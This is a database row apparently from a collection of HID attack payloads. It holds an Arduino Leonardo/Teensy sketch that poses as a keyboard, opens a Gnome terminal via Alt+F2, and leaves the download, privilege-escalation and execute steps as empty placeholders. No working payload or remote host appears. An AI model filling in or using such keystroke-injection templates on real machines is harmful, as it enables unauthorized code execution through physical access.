INSERT INTO EXPLOIT VALUES(14,'Matias Nahuel Heredia','/*\u000a  This payload Execute a script \u000a  in a ENGLISH Gnome Kali linux\u000a  you need to load this program\u000a  one ARDUINO LEONARDO  \u000a */\u000a\u000a\u000a// change this to match your platform:\u000a\u000avoid setup() {\u000a  // make pin 2 an input and turn on the \u000a  // pullup resistor so it goes high unless\u000a  // connected to ground:\u000a  pinMode(2, INPUT_PULLUP);\u000a  Keyboard.begin();\u000a}\u000a\u000avoid loop() {\u000a  int slash = 38;\u000a/*Execute the terminalk\u000a*/\u000adelay(2000);\u000a  Keyboard.press(KEY_LEFT_ALT);\u000a  delay(100);\u000a  Keyboard.press(KEY_F2);\u000a  delay(100);\u000a  Keyboard.press(KEY_LEFT_ALT);\u000a  delay(100);\u000a  Keyboard.press(KEY_F2);\u000a  delay(100);\u000a  Keyboard.releaseAll();\u000a  delay(500);\u000a  Keyboard.write(''g'');\u000a  delay(500);\u000a  Keyboard.println("nome-konsole");\u000a  delay(5000);\u000a  /**\u000a  Download de script\u000a  */\u000a  <!-- keyboard download -->\u000a  delay(1000);\u000a  /*\u000a  privileges\u000a  */\u000a  <!-- keyboard privileges -->\u000a  delay(1000);\u000a  /*\u000a  Execute script\u000a  */\u000a  <!-- keyboard execute script -->\u000a  delay(1000);\u000a  \u000a  Keyboard.println("exit");\u000a  \u000a  delay(20000);\u000a\u000a}\u000a\u000a','2013-10-21 04:37:42.437000','Execute Script Kali Gnome Linux','TEENSY','ENGLISH')
